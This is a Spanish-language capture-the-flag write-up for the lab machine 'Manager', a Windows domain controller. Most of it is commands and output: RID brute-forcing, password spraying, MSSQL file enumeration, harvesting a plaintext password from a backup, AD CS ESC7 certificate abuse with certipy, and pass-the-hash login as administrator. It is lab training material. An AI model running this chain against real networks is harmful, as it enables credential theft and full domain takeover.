>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.6.115
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 14:37 EST
Nmap scan report for 10.129.6.115
Host is up (0.061s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-15 02:38:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
49771/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.41 seconds
```

>Obtenemos nombres de usuario mediante **RID Brute-Force** empleando una **sesión Guest**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ nxc smb 10.129.6.115 -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk {'print $2'} FS="\\" | awk {'print $1'} FS=" " > users
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ cat users                  
administrator
guest
krbtgt
DC01$
zhong
cheng
ryan
raven
jinWoo
chinHae
operator
```

>Hacemos password spray y vemos que tenemos al usuario: `operator:operator`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ nxc smb 10.129.6.115 -u users -p users -t 100
SMB         10.129.6.115    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.115    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.129.6.115    445    DC01             [-] manager.htb\cheng:zhong STATUS_LOGON_FAILURE
<SNIP>
SMB         10.129.6.115    445    DC01             [+] manager.htb\operator:operator 
```

>Accedemos al MSSQL con las credenciales encontradas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ mssqlclient.py 'manager.htb/operator:operator@10.129.6.115' -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```

>Vemos que podemos ver con `xp_dirtree` el filesystem:

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0 
```

>Si accedemos a la ruta `\inetpub\wwwroot` vemos que hay un archivo de backup:

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree \inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1  
```

>Lo descargamos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ wget http://10.129.6.115/website-backup-27-07-23-old.zip
--2026-02-14 14:55:38--  http://10.129.6.115/website-backup-27-07-23-old.zip
Connecting to 10.129.6.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip                 100%[=====================================================================================================>]   1021K  1.01MB/s    in 1.0s    

2026-02-14 14:55:39 (1.01 MB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

>Lo descomprimimos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ unzip website-backup-27-07-23-old.zip 

┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ tree                   
.
├── about.html
├── contact.html
├── css
│   ├── bootstrap.css
│   ├── responsive.css
│   ├── style.css
│   ├── style.css.map
│   └── style.scss
├── images
│   ├── about-img.png
│   ├── body_bg.jpg
│   ├── call-o.png
│   ├── call.png
│   ├── client.jpg
│   ├── contact-img.jpg
│   ├── envelope-o.png
│   ├── envelope.png
│   ├── hero-bg.jpg
│   ├── location-o.png
│   ├── location.png
│   ├── logo.png
│   ├── menu.png
│   ├── next.png
│   ├── next-white.png
│   ├── offer-img.jpg
│   ├── prev.png
│   ├── prev-white.png
│   ├── quote.png
│   ├── s-1.png
│   ├── s-2.png
│   ├── s-3.png
│   ├── s-4.png
│   └── search-icon.png
├── index.html
├── js
│   ├── bootstrap.js
│   └── jquery-3.4.1.min.js
└── service.html
```

>En el archivo `.old-conf.xml` vemos las credenciales siguientes: `raven:R4v3nBe5tD3veloP3r!123`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ cat .old-conf.xml 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

>Vemos que esas credenciales son válidas para conectarnos por **WinRM**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ nxc winrm 10.129.6.115 -u raven -p 'R4v3nBe5tD3veloP3r!123'
WINRM       10.129.6.115    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) 
WINRM       10.129.6.115    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

>Nos conectamos por **WinRM** y leemos la user flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ evil-winrm -i 10.129.6.115 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> cat ..\Desktop\user.txt
397e61a56815734838254555d7328231
```

>Vemos que en el servidor hay un servicio de ADCS con la CA `manager-DC01-CA`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ nxc ldap 10.129.6.115 -u raven -p 'R4v3nBe5tD3veloP3r!123' -M adcs
LDAP        10.129.6.115    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.6.115    389    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
ADCS        10.129.6.115    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.6.115    389    DC01             Found PKI Enrollment Server: dc01.manager.htb
ADCS        10.129.6.115    389    DC01             Found CN: manager-DC01-CA
```

>Buscamos vulnerabilidades de ADCS con **certipy** y vemos que la **CA es vulnerable a** **ESC7**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy find -vulnerable -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.6.115 -target dc01.manager.htb -stdout  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

>Podemos abusar la ACL **ManageCa** para darnos permisos de **ManageCertificates** añadiéndonos como nuevos officers:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.6.115 -ca manager-DC01-CA -add-officer raven        
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

>Ahora, habilitaremos la plantilla **SubCA** que nos permite efectuar un **ESC1** lo único que solo los administradores pueden inscribirse a ella, aunque al ser officers, podremos aceptar las solicitudes de certificados:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.6.115 -ca manager-DC01-CA -enable-template SubCA
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

>Hacemos una solicitud del **certificado del admin** usando la plantilla **SubCA** y nos guardamos el **id de la request** (asegurar guardar el private key porque si no no tendremos un pfx):

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.6.115 -ca manager-DC01-CA -template SubCA -target dc01.manager.htb -upn 'administrator@manager.htb'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate
```

>Ahora como officers vamos a **aprobar la solicitud de certificado** con **id 19**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.6.115 -ca manager-DC01-CA -issue-request 19
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 19
```

>Ahora obtenemos el certificado que habiamos pedido previamente:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.6.115 -ca manager-DC01-CA -template SubCA -target dc01.manager.htb -upn 'administrator@manager.htb' -retrieve 19
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '19.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

>Nos autenticamos usando el certificado y obtenemos el **hash NTLM** del **Administrador**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ sudo ntpdate 10.129.6.115                                                                                           
[sudo] password for kali: 
2026-02-14 22:18:39.628057 (-0500) +25201.022454 +/- 0.030439 10.129.6.115 s1 no-leap
CLOCK: time stepped by 25201.022454
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.6.115
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

>Nos conectamos por WinRM y leemos la flag final:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/manager]
└─$ evil-winrm -i 10.129.6.115 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
4b1f061040a26a5a297737f6eaba07fa
```
